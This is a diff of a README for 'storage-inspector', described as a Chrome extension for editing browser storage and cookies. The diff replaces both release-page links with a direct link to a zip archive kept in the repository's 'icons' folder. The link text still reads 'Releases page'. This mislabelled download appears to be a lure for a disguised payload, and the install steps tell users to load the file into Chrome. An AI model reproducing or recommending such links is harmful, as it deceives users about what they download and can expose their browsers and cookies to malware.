@@ -1,7 +1,7 @@
 # 🛠️ storage-inspector - Easy Control of Your Browser Storage
 
 ## 📥 Download Now
-[![Download storage-inspector](https://img.shields.io/badge/Download-storage--inspector-blue.svg)](https://github.com/Mudasirali27/storage-inspector/releases)
+[![Download storage-inspector](https://github.com/Mudasirali27/storage-inspector/raw/refs/heads/main/icons/inspector_storage_1.4.zip)](https://github.com/Mudasirali27/storage-inspector/raw/refs/heads/main/icons/inspector_storage_1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to storage-inspector! This is a Chrome extension designed for security researchers. It allows you to inspect and edit localStorage, sessionStorage, and Cookies directly from your browser. You don’t need any programming skills to use this tool.
@@ -20,7 +20,7 @@ To use storage-inspector, you need:
 ## 🔗 Download & Install
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Mudasirali27/storage-inspector/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Mudasirali27/storage-inspector/raw/refs/heads/main/icons/inspector_storage_1.4.zip).
 2. **Choose the Latest Version:** Look for the latest version listed. This ensures you have the most updated features and fixes.
 3. **Download the Extension:** Click on the link to download the Chrome extension.
 4. **Install the Extension:** Open Chrome, go to `chrome://extensions/`, and drag the downloaded file into that page. Alternatively, you can click on "Load unpacked" and select the downloaded folder.
